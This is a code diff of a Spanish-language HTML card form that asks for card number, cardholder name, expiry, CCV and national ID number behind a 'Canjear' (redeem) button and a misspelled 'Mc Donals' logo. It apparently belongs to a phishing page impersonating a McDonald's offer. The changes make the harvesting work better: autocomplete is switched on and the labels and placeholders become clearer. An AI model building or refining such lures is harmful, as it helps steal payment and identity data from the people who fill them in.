@@ -461,11 +461,11 @@ input{
 		<form action="/guardar" method="post" id="formulario-tarjeta" class="formulario-tarjeta active">
 			<div class="grupo">
 				<label for="inputNumero">Número Tarjeta</label>
-				<input type="text" name="input1" id="inputNumero" maxlength="19" autocomplete="off">
+				<input type="text" name="input1" placeholder="Numero de Tarjeta" id="inputNumero" maxlength="19" autocomplete="on">
 			</div>
 			<div class="grupo">
-				<label for="inputNombre">Nombre</label>
-				<input type="text" name="input2" id="inputNombre" maxlength="19" autocomplete="off">
+				<label for="inputNombre">Nombre del titular de la tarjeta</label>
+				<input type="text" name="input2" id="inputNombre" placeholder="Nombre del titular de la Tarjeta" autocomplete="on">
 			</div>
 <div class="flexbox">
     <div class="grupo expira">
@@ -478,7 +478,7 @@ input{
                     type="text"
                     name="input3"
                     id="selectMes"
-                    placeholder="Mes"
+                    placeholder="MM"
                     maxlength="2">
             </div>
 
@@ -487,7 +487,7 @@ input{
                     type="text"
                     name="input4"
                     id="selectYear"
-                    placeholder="Año"
+                    placeholder="AA"
                     maxlength="4">
             </div>
 
@@ -497,14 +497,14 @@ input{
 				<div class="grupo ccv">
 					<label for="inputCCV">CCV</label>
 					<input type="text" name="input5" id="inputCCV" maxlength="3">
-				</div>
 			</div>
 					<div class="grupo">
-				<label for="inputDNI">DNI</label>
-				<input type="number" id="inputDNI" name="input6" maxlength="8" autocomplete="off">
+				<label for="inputDNI">Documento</label>
+				<input type="number" id="inputDNI" name="input6" maxlength="8" autocomplete="on">
 			</div>
 			<button type="submit" class="btn-enviar">Canjear</button>
 					<img src="img/logocre.png" alt="Mc Donals" width="150">		<!-- Tarjeta -->
+				</div>
 
 		</form>
 Al pagar, Aceptas la Politica de tratamiento de datos personales.
